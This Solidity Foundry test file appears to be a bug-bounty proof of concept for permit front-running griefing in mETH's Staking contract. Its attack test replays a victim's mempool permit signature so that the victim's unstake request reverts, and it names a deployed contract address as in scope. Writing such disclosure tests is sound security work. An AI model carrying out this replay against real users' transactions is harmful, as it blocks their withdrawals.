// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {METH} from "../src/METH.sol";
import {Staking} from "../src/Staking.sol";
import {UnstakeRequestsManager} from "../src/UnstakeRequestsManager.sol";
import {SignerUtils} from "./utils/SignerUtils.sol";
import {StakingTest} from "./Staking.t.sol";

/// @notice Demonstrates Lido DAO issue #803, "Potential withdrawal request griefing
///         vector via `permit` front-running", present in mETH's
///         `Staking.unstakeRequestWithPermit`.
///
/// The class is already validated: that Lido issue was reported through Immunefi,
/// rated MEDIUM and paid. Lido's proposed fix was to check the existing allowance
/// before calling permit:
///
///     if (STETH.allowance(msg.sender, address(this)) < _permit.value) {
///         STETH.permit(msg.sender, address(this), _permit.value, ...);
///     }
///
/// mETH has no such check:
///
///     function unstakeRequestWithPermit(...) external returns (uint256) {
///         SafeERC20Upgradeable.safePermit(mETH, msg.sender, address(this), methAmount, deadline, v, r, s);
///         return _unstakeRequest(methAmount, minETHAmount);
///     }
///
/// `Staking` is in mETH's Immunefi scope (0xe3cBd06D7dadB3F4e6557bAb7EdD924CD1489E8f),
/// and its existing tests cover only the happy path, so the griefing case is untested.
///
/// Attack: the (v, r, s) triplet is public calldata in a pending transaction.
/// Anyone reading the mempool can submit the permit themselves first, consuming
/// the nonce. The victim's transaction then fails with "ERC2612: invalid
/// signature" and their withdrawal request never reaches the queue.
contract PermitFrontRunningTest is StakingTest {
    /// `UnstakeRequestsManager.create` is `onlyStakingContract`, so the existing
    /// suite stubs it. Mirror that: this test is about the permit path, not about
    /// the request landing.
    function _stubCreate(address requester, uint128 methAmount) internal {
        vm.mockCall(
            address(unstakeManager),
            abi.encodeWithSelector(UnstakeRequestsManager.create.selector, requester, methAmount, uint128(0)),
            abi.encode(uint256(1))
        );
    }

    /// Control: with nobody intercepting, the permit-based unstake succeeds.
    function testPermitUnstakeSucceedsWhenNotFrontRun() public {
        uint256 pk = uint256(keccak256("victim-key-1"));
        address victim = vm.addr(pk);
        uint128 methAmount = 1 ether;

        vm.deal(victim, 10 ether);
        // mint is staking-only; the suite mints by pranking the staking contract
        _mintMETH(victim, 10 ether);

        uint256 deadline = block.timestamp + 1 days;
        SignerUtils.Permit memory permit = SignerUtils.Permit({
            owner: victim,
            spender: address(staking),
            value: methAmount,
            nonce: mETH.nonces(victim),
            deadline: deadline
        });
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(pk, SignerUtils.getTypedDataHash(mETH.DOMAIN_SEPARATOR(), permit));

        _stubCreate(victim, methAmount);
        vm.prank(victim);
        staking.unstakeRequestWithPermit(methAmount, 0, deadline, v, r, s);
    }

    /// The finding: an attacker copies the signature out of the mempool and
    /// submits the permit first. The nonce is consumed and the victim's
    /// withdrawal request reverts.
    function testPermitUnstakeGriefedByFrontRunner() public {
        uint256 pk = uint256(keccak256("victim-key-2"));
        address victim = vm.addr(pk);
        address attacker = makeAddr("attacker");
        uint128 methAmount = 1 ether;

        vm.deal(victim, 10 ether);
        // mint is staking-only; the suite mints by pranking the staking contract
        _mintMETH(victim, 10 ether);

        uint256 nonceBefore = mETH.nonces(victim);
        uint256 deadline = block.timestamp + 1 days;

        // The victim signs and broadcasts. (v, r, s) are calldata: anyone can read them.
        SignerUtils.Permit memory permit = SignerUtils.Permit({
            owner: victim,
            spender: address(staking),
            value: methAmount,
            nonce: nonceBefore,
            deadline: deadline
        });
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(pk, SignerUtils.getTypedDataHash(mETH.DOMAIN_SEPARATOR(), permit));

        // ATTACKER: replays the victim's own signature, front-running the request.
        vm.prank(attacker);
        mETH.permit(victim, address(staking), methAmount, deadline, v, r, s);

        // The nonce is consumed by the attacker's call...
        assertGt(mETH.nonces(victim), nonceBefore, "attacker consumed the victim's permit nonce");

        // ...so the victim's still-pending transaction can no longer be valid.
        _stubCreate(victim, methAmount);
        vm.prank(victim);
        vm.expectRevert("ERC20Permit: invalid signature");
        staking.unstakeRequestWithPermit(methAmount, 0, deadline, v, r, s);
    }
}
